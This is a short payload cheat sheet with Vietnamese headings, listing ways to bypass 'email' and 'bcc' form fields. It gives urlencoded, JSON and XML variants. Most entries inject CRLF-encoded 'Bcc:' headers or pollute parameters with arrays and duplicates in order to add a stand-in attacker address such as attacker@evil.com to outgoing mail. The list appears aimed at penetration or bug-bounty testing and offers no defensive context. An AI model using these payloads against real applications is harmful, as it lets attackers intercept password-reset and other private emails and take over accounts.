
---

## ✅ **FULL DANH SÁCH BỎ QUA - Bypass `email` / `bcc` trong form**

### 🥇 **Dạng 1 – `application/x-www-form-urlencoded`**

```bash
email=test@gmail.com|test01@gmail.com
email=test@gmail.com,test01@gmail.com
email=test@gmail.com;test01@gmail.com
email[]=test@gmail.com&email[]=test01@gmail.com
email=test@gmail.com%0ABcc:attacker@evil.com
email=test@gmail.com%0Ato:admin@target.com%0ABcc:attacker@evil.com
email=test@gmail.com%0D%0ABcc:attacker@evil.com
bcc:email=test@gmail.com
bcc=email=test@gmail.com
bcc[0]=test@gmail.com&bcc[1]=attacker@evil.com
bcc="test@gmail.com\r\nBcc:attacker@evil.com"
```

---

### 🥈 **Dạng 2 – JSON body (`application/json`)**

```json
{"email": "test@gmail.com"}
{"email": ["test@gmail.com", "attacker@evil.com"]}
{"email": ["test@gmail.com", {"email": "attacker@evil.com"}]}
{"bcc":"test@gmail.com"}
{"to":"test@gmail.com", "bcc":"attacker@evil.com"}
{"email":"test@gmail.com\r\nBcc:attacker@evil.com"}
{"email":"test@gmail.com\nBcc:evil@evil.com"}
{"email[0]":"test@gmail.com", "email[1]":"attacker@evil.com"}
{"email":"test@gmail.com", "email.extra":"attacker@evil.com"}
{"email":{"0":"test@gmail.com","1":"attacker@evil.com"}}
```

---

### 🥉 **Dạng 3 – XML body (`application/xml`)**

```xml
<root>
  <email>test@gmail.com</email>
  <email>attacker@evil.com</email>
</root>

<root>
  <email>test@gmail.com&#10;Bcc:evil@evil.com</email>
</root>
```

---




